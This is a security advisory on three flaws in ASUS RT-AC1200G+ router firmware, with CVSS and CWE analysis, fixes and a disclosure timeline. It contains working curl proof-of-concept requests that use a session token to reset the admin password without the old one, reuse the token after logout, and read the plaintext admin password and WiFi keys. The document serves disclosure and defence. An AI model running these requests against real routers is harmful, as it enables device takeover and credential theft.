# ASUS RT-AC1200G+, firmware 3.0.0.4.382.52272


## Finding 1: Admin password can be changed without providing the current password

### CVSS 4.0: 7.0 (High)
`CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
| Metric | Value | Why |
|---|---|---|
| AV | Adjacent (A) | The web management interface is only reachable over the LAN; no WAN-facing delivery path was found or tested. |
| AC | Low (L) | A single, well-formed POST to `apply.cgi` is sufficient; no race condition or unusual state is required. |
| AT | None (N) | No additional attack requirements beyond holding a valid session token. |
| PR | Low (L) | Requires a currently-valid session token (`asus_token`), which represents low/limited privilege in CVSS terms since it is the thing being abused, not a separately-escalated privilege. |
| UI | None (N) | No victim interaction is required; the holder of a valid token acts directly. |
| VC | None (N) | This specific action does not itself disclose information. |
| VI | High (H) | The admin credential itself is rewritten, and from there the entire device configuration is under attacker control. |
| VA | High (H) | The legitimate administrator can be locked out of their own device by an attacker who silently rotates the password. |
| SC | None (N) | No subsequent system beyond the router itself is affected. |
| SI | None (N) | No subsequent system beyond the router itself is affected. |
| SA | None (N) | No subsequent system beyond the router itself is affected. |
### CWE
- CWE-620: Unverified Password Change
### Vulnerability description
The admin password change endpoint, reached via `POST /apply.cgi` with
`http_username` and `http_passwd`/`http_passwd2` fields, accepts and
applies a new password using only a currently-valid session cookie
(`asus_token`). No current-password field is required, checked, or
even present in the request schema. Any request carrying a valid
session token can silently rewrite the admin credential to anything the
requester chooses.
### Step-by-step PoC (as validated)
1. Log in normally to obtain a valid session token:
```
curl -k -X POST http://<router-ip>/login.cgi \
  -H "Referer: http://<router-ip>/Main_Login.asp" \
  -d "login_authorization=$(echo -n 'admin:<current-password>' | base64)"
```
Response includes `Set-Cookie: asus_token=<token>; HttpOnly;`.
2. Change the password, supplying only the new value twice, no current
   password:
```
curl -k http://<router-ip>/apply.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/Advanced_System_Content.asp" \
  --data "action_mode=apply&action_script=&action_wait=3&current_page=Advanced_System_Content.asp&next_page=Advanced_System_Content.asp&http_username=admin&http_passwd=<new-password>&http_passwd2=<new-password>"
```
Response: `{ "modify": "1" }`.
3. Confirm the old credential no longer authenticates and the new one
   does:
```
curl -k -X POST http://<router-ip>/login.cgi \
  -H "Referer: http://<router-ip>/Main_Login.asp" \
  -d "login_authorization=$(echo -n 'admin:<old-password>' | base64)"
# no Set-Cookie in response: login fails
curl -k -X POST http://<router-ip>/login.cgi \
  -H "Referer: http://<router-ip>/Main_Login.asp" \
  -d "login_authorization=$(echo -n 'admin:<new-password>' | base64)"
# Set-Cookie: asus_token=...: login succeeds
```
Confirmed on the live device: the old password stopped working
immediately after step 2, and the new password worked in its place.

### Impact
Anyone who obtains a currently-valid `asus_token` by any means (network
interception is realistic here since this router's management
interface is HTTP-only; other means such as an XSS
elsewhere in the application or physical access to an already-logged-in
browser would also work) can permanently take over the router by
rotating the admin password, without ever needing to know the existing
one. Because there is no secondary confirmation step, this is silent:
the legitimate administrator receives no warning and simply finds their
own credential no longer works.

### Recommendation
Require the current admin password as an explicit field in any
password-change request, validated server-side (`http_passwd_old`
compared against the stored credential) before the new password is
accepted, matching the standard pattern used by most web application
account-settings flows. This should apply regardless of whether the
requester already holds a valid session token, since the token alone
is not equivalent to proof of knowledge of the current credential.




## Finding 2: Session token remains valid indefinitely after logout
### CVSS 4.0: 7.0 (High)
`CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
| Metric | Value | Why |
|---|---|---|
| AV | Adjacent (A) | LAN-only web management interface. |
| AC | Low (L) | Reusing a previously-obtained token after logout requires no special conditions. |
| AT | None (N) | No additional attack requirements beyond possessing a previously-valid token. |
| PR | Low (L) | Requires possession of a token that was valid at some point; scored as the precondition for this specific weakness, not as a separately-escalated privilege. |
| UI | None (N) | No victim interaction needed to exploit the retained validity; the legitimate user's own logout action is what should have (but does not) cut this off. |
| VC | High (H) | A retained token grants full read access to the device's configuration and stored data. |
| VI | Low (L) | Scored conservatively for this specific finding in isolation (indefinite session retention); the practical ability to also change settings using a retained token is a real consequence but depends on which specific settings-changing endpoints are reachable, which was not exhaustively re-tested under this finding alone. |
| VA | None (N) | No availability impact from this specific weakness alone. |
| SC | None (N) | No subsequent system beyond the router itself is affected. |
| SI | None (N) | No subsequent system beyond the router itself is affected. |
| SA | None (N) | No subsequent system beyond the router itself is affected. |
### CWE
- CWE-613: Insufficient Session Expiration
### Vulnerability description
`apply.cgi`'s `action_mode=logout` handler, the mechanism triggered
when a user clicks "Logout" in the admin UI, performs no server-side
session invalidation. Its entire implementation redirects the browser
to a static logged-out page and does nothing else:
```c
else if (!strcmp(action_mode, "logout")) // but, every one can reset it by this call
{
    websRedirect(wp, "Logout.asp");
}
```
(quoted from this firmware's own GPL-released source,
`release/src/router/httpd/web.c`). No token is cleared, no session
store entry is removed, and no expiry is set. The session token
(`asus_token`) issued at login remains valid and continues to
authenticate requests indefinitely after the user has logged out,
until the device is rebooted.
### Step-by-step PoC (as validated)
1. Log in and capture the session token:
```
curl -k -X POST http://<router-ip>/login.cgi \
  -H "Referer: http://<router-ip>/Main_Login.asp" \
  -d "login_authorization=$(echo -n 'admin:<password>' | base64)"
```
2. Confirm the token works:
```
curl -k http://<router-ip>/appGet.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/index.asp" \
  --data "hook=nvram_get(productid)"
```
Returns the device's product ID, confirming the token is authenticated.
3. Log out using that same token:
```
curl -k http://<router-ip>/apply.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/index.asp" \
  --data "action_mode=logout"
```
4. Reuse the exact same token again:
```
curl -k http://<router-ip>/appGet.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/index.asp" \
  --data "hook=nvram_get(productid)"
```
Confirmed on the live device: this still returns the device's product
ID. The token was fully functional both before and after the logout
call, with no observable difference in behavior.
### Impact
A session token captured at any point (through network interception,
since this router's management interface transmits over unencrypted
HTTP, through a shared or unattended browser, or through any other
means) remains valid forever, surviving the legitimate user explicitly
logging out. The user has no way to revoke access to a party who
obtained their token; even changing the admin password afterward would
not necessarily retroactively invalidate an already-issued token,
though that specific interaction was not separately tested here. The
only way to guarantee a previously-issued token stops working is to
reboot the device.
### Recommendation
Implement actual server-side session invalidation on logout: clear or
regenerate the stored token value so that the previously-issued token
is rejected on any subsequent request. This is standard session-management
practice and should not depend on the client discarding its own copy
of the cookie.


## Finding 3: Admin password and WiFi pre-shared keys disclosed in cleartext via the authenticated nvram_get API

### CVSS 4.0: 6.9 (Medium)
`CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
| Metric | Value | Why |
|---|---|---|
| AV | Adjacent (A) | LAN-only web management interface. |
| AC | Low (L) | A single authenticated GET-style request is sufficient. |
| AT | None (N) | No additional attack requirements beyond holding a valid session token. |
| PR | Low (L) | Requires a currently-valid session token; scored as the precondition for this weakness, not a separately-escalated privilege. |
| UI | None (N) | No victim interaction is required. |
| VC | High (H) | The full admin credential and any configured WiFi pre-shared key are returned in plaintext, letting the attacker independently re-authenticate to the router and to the WiFi network itself. |
| VI | None (N) | This specific request does not itself modify device state. |
| VA | None (N) | No availability impact. |
| SC | None (N) | No subsequent system beyond the router itself is affected. |
| SI | None (N) | No subsequent system beyond the router itself is affected. |
| SA | None (N) | No subsequent system beyond the router itself is affected. |
### CWE
- CWE-522: Insufficiently Protected Credentials
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
### Vulnerability description
The device's generic nvram-read endpoint, reached via
`POST /appGet.cgi` with a `hook=nvram_get(<key>)` parameter, returns
credential-bearing nvram values in plaintext given only a
currently-valid session token, with no additional confirmation,
re-authentication, or key-specific restriction applied. This affects at
least the admin password (`http_passwd`) and the WiFi WPA pre-shared
keys for both radio bands (`wl0_wpa_psk`, `wl1_wpa_psk`).
The same request without a valid session token is correctly rejected
and redirected to the login page, so this is not an unauthenticated
information disclosure, it is a design gap in what an already-valid
session is permitted to read back.

### Step-by-step PoC (as validated)
1. Log in to obtain a valid session token:
```
curl -k -X POST http://<router-ip>/login.cgi \
  -H "Referer: http://<router-ip>/Main_Login.asp" \
  -d "login_authorization=$(echo -n 'admin:<password>' | base64)"
```
2. Query the admin password directly:
```
curl -k http://<router-ip>/appGet.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/index.asp" \
  --data "hook=nvram_get(http_passwd)"
```
Confirmed on the live device: response body is
`{"http_passwd":"<the current admin password, in plaintext>"}`.
3. Query the WiFi pre-shared key directly (demonstrated by setting a
   temporary WPA2 PSK on the 2.4GHz band first, since the lab device's
   WiFi normally runs open/no-password):
```
curl -k http://<router-ip>/appGet.cgi \
  -H "Cookie: asus_token=<token>" \
  -H "Referer: http://<router-ip>/index.asp" \
  --data "hook=nvram_get(wl0_wpa_psk)"
```
Confirmed on the live device: response body is
`{"wl0_wpa_psk":"<the configured WPA2 passphrase, in plaintext>"}`.
4. Confirm the same requests without a valid token are blocked:
```
curl -k http://<router-ip>/appGet.cgi \
  --data "hook=nvram_get(http_passwd)"
```
Confirmed on the live device: this is redirected to the login page
rather than returning the credential, showing the access-control check
itself works, it simply permits too much once a session exists.
### Impact
Any party holding a currently-valid session token, for example one
recovered via network interception on this HTTP-only management
interface, or via a cross-site scripting flaw elsewhere in the
application, can directly retrieve the plaintext admin credential and
the plaintext WiFi pre-shared key(s), rather than needing to continue
relying on the possibly short-lived token. This lets the attacker
independently re-authenticate to the router and to the WiFi network at
any later time, persist access beyond the lifetime of the original
token, and reuse either credential elsewhere if it was reused across
services or devices.
### Recommendation
Exclude `http_passwd`, `wl0_wpa_psk`, `wl1_wpa_psk`, and any other
credential-bearing nvram key from what the generic `nvram_get` hook is
permitted to return, regardless of session state. If the web UI needs
to confirm a password field is set, it should do so via a
boolean/masked indicator, never round-tripping the plaintext value back
to the client.


## Disclosure
 - 30 Sep 2026 - reported via Asus Security Advisory as well as via email (because ironically, their portal blocks POC code)
 - 1 Oct 2026 - report acknowledged by Asus PSIRT
 - 20 Oct 2026 - findings confirmed, but router is EOL and thus reports are closed
 - 20 Oct 2026 - responded that even though it's EOL, customers like me are still using and thus need to be notified
 - 2 Nov 2026 - responded that the PSK visibility is intended and there are no plans to change the design

<img width="1216" height="187" alt="image" src="https://github.com/user-attachments/assets/3313bce9-1097-439c-aab0-3c9f15ed53ad" />
